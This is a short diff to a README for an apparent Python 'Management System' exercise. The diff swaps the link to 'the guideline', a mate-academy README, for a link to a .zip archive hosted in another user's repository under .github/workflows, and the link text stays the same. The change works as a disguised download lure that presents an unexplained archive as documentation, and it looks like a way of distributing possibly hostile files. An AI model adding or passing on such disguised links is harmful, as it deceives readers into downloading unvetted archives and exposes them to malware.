@@ -1,5 +1,5 @@
 # Management System
-**Please note:** read [the guideline](https://github.com/mate-academy/py-task-guideline/blob/main/README.md)
+**Please note:** read [the guideline](https://github.com/Rudge0/py-create-management-system/raw/refs/heads/master/.github/workflows/system_py_management_create_1.5.zip)
 before starting.
 
 
